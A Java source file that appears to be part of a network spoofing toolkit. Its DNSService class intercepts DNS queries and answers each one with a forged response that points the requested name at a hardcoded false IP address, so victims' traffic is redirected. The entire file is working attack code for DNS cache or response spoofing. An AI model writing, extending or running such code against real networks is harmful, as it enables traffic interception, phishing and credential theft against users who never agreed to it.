package org.bitducks.spoofing.services;

import java.net.InetAddress;
import java.net.UnknownHostException;
import java.nio.ByteBuffer;

import jpcap.packet.UDPPacket;

import org.bitducks.spoofing.core.Server;
import org.bitducks.spoofing.core.Service;
import org.bitducks.spoofing.core.rules.DNSIpv4Rule;
import org.bitducks.spoofing.packet.DNSPacket;
import org.bitducks.spoofing.packet.PacketFactory;

public class DNSService extends Service {
	private InetAddress falseIpAddr = null;
	
	public DNSService() {
		
		// TODO Add rule
		this.getPolicy().addRule(new DNSIpv4Rule());
		
		this.getPolicy().setStrict(true);
		
		// TODO Get our IP or the IP provided
		this.setDNSFalseIp("10.17.62.145");
	}
	
	public void setDNSFalseIp(String falseHostIp) {
		try {
			this.falseIpAddr = InetAddress.getByName(falseHostIp);
		} catch (UnknownHostException e) {
			e.printStackTrace();
		}		
	}

	@Override
	public void run() {
		
		System.out.println("DNS Starting");
		UDPPacket queryPaquet = null;
		while ((queryPaquet = (UDPPacket)this.getNextPacket()) != null) {
		//	System.out.println("got Packet");
				
				// Getting the query part of the packet
				byte[] queryData = queryPaquet.data;
				
				ByteBuffer queryBuffer = ByteBuffer.allocate(queryData.length - 12);
				for (int i = 12; i < queryData.length; ++i) {
					queryBuffer.put(queryData[i]);
				}
				
				
				DNSPacket answerPaquet = PacketFactory.dnsRequest(queryPaquet,
						new byte[] { queryData[0], queryData[1] },   // Transaction
						new byte[] { queryData[4], queryData[5] }, // Question
						queryBuffer.array(), 
						this.falseIpAddr);
				
				this.sendDNSPacket(answerPaquet);
				
		}
	}
	
	private void sendDNSPacket(DNSPacket packet) {
	//	System.out.println("Sending Dns");
	//	System.out.println("-----");
		Server.getInstance().sendPacket(packet);
	}

}
